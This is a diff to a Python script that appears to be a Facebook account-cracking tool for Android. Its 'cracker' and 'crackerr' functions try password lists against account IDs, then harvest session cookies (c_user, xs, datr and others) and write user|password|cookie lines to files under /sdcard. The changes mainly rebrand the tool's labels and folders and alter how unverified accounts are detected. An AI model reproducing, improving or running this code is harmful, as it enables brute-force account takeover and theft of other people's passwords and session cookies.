@@ -12,7 +12,7 @@ import string
 import uuid
 import requests
 from concurrent.futures import ThreadPoolExecutor
-try:os.mkdir('/sdcard/j4rvis')
+try:os.mkdir('/sdcard/BITHI')
 except:pass
 R = '\x1b[1;91m' 
 OR = '\033[1;35m'
@@ -322,7 +322,7 @@ def cracker(ids,passlist):
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
+                #print('\033[1;91m [sumon-CP] '+ids+' | '+pas+'')
                 open('/sdcard/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
@@ -424,33 +424,28 @@ def crackerr(ids,passlist):
                 #kuki = convert(session.cookies.get_dict())
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
-                xs_value = None
-                for part in kuki.split(';'):
-                    if part.startswith('xs='):
-                        xs_value = part.split('=', 1)[1]
-                        break
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
+                    if "confirmemail.php" in response.url:
+                        print('\033[1;92m [sumon-NV] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        open("/sdcard/BITHI/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
                     else:
-                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
+                        print('\033[1;92m [sumon-OK] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        open("/sdcard/BITHI/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                #print('\033[1;91m [sumon-CP] '+ids+' | '+pas+'')
+                open('/sdcard/BITHI/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
